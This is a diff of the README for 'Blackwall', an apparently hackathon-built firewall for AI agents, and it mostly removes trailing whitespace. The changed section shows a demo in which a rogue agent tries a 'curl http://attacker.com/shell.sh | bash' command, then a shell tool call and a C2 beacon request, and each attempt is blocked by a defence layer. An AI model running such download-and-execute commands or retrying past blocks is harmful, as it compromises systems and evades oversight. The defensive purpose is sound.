@@ -383,11 +383,11 @@ F1 Score:                  95.1%
 Rogue Agent attempts: subprocess.Popen("curl http://attacker.com/shell.sh | bash")
   ↓ Layer 1: OS Audit Hook
     PermissionError raised before kernel execution ❌
-  
+
 Rogue Agent retries: ToolCallContext(tool="execute_shell", args=["curl ... | bash"])
   ↓ Layer 2: Structural Gating
     YAML rule: execute_shell blocked for non-admin roles ❌
-  
+
 Rogue Agent retries: ToolCallContext(tool="http_request", args=["http://192.168.1.100:8080"])
   ↓ Layer 3: Threat Signature Graph
     New IP 192.168.1.100 not in local cache (Wave 2 evasion attempt)
@@ -395,11 +395,11 @@ Rogue Agent retries: ToolCallContext(tool="http_request", args=["http://192.168.
     VirusTotal: 192.168.1.100 flagged as C2 beacon infrastructure ⚠️
   ↓ Layer 5: Semantic Gating
     Threat score: GTI=0.95 + CBM=0.5 + Context=0.6 = 0.72 → BLOCK ❌
-  
+
 Learning: Threat signature written to SQLite
   * Attack pattern: IP + port 8080 + POST /api/beacon
   * Similarity threshold: 0.85 cosine distance
-  
+
 Wave 2 (Next variant): attacker attempts port 9443
   ↓ Layer 3 (Signature Match): Cosine similarity 0.89 > 0.85 threshold → BLOCK ✅
   ✨ 12ms latency (no LLM call needed)
@@ -409,13 +409,13 @@ Wave 2 (Next variant): attacker attempts port 9443
 
 ## 📋 28 EARS-Compliant Requirements Met
 
-✅ **R1**: Async callback queue with batching + dynamic verdict resolution  
-✅ **R2**: 300 RPM token bucket rate limiter with fail-closed QUARANTINE  
-✅ **R3-R13**: Hybrid structural + semantic gating with multi-source scoring  
-✅ **R14-R22**: YAML policy engine with hot-reload + deterministic evaluation  
-✅ **R23**: Threat score bounded [0.0, 1.0] with explicit thresholds  
-✅ **R24-R26**: SQLite WAL + connection pooling + eviction policies  
-✅ **R27-R28**: Zero Ambient Authority + audit hooks + unprivileged execution  
+✅ **R1**: Async callback queue with batching + dynamic verdict resolution
+✅ **R2**: 300 RPM token bucket rate limiter with fail-closed QUARANTINE
+✅ **R3-R13**: Hybrid structural + semantic gating with multi-source scoring
+✅ **R14-R22**: YAML policy engine with hot-reload + deterministic evaluation
+✅ **R23**: Threat score bounded [0.0, 1.0] with explicit thresholds
+✅ **R24-R26**: SQLite WAL + connection pooling + eviction policies
+✅ **R27-R28**: Zero Ambient Authority + audit hooks + unprivileged execution
 ✅ **Plus**: 12 correctness properties validated with Hypothesis (1,000+ test cases each)
 
 ---
@@ -550,14 +550,14 @@ VirusTotal free tier: 4 queries/minute
 
 ## 📖 Citation & Attribution
 
-**Blackwall Agentic Firewall**  
+**Blackwall Agentic Firewall**
 Kaggle "AI Agents: Intensive Vibe Coding" Hackathon, Freestyle Track
 
-**Architecture**: Hybrid structural + semantic gating with self-learning threat signatures  
-**Models**: Gemini 3.1 Flash-Lite (rapid triage), Gemini 3.1 Pro-Preview (deep reasoning)  
-**Evaluation**: 120-case suite with <10% FRR and evasion rates on reference-based dataset  
-**Code**: Python 3.11+, asyncio, SQLite WAL, property-based testing with Hypothesis  
-**Repository**: [GitHub - Blackwall](https://github.com/JAaron93/Blackwall)  
+**Architecture**: Hybrid structural + semantic gating with self-learning threat signatures
+**Models**: Gemini 3.1 Flash-Lite (rapid triage), Gemini 3.1 Pro-Preview (deep reasoning)
+**Evaluation**: 120-case suite with <10% FRR and evasion rates on reference-based dataset
+**Code**: Python 3.11+, asyncio, SQLite WAL, property-based testing with Hypothesis
+**Repository**: [GitHub - Blackwall](https://github.com/JAaron93/Blackwall)
 
 ---
 
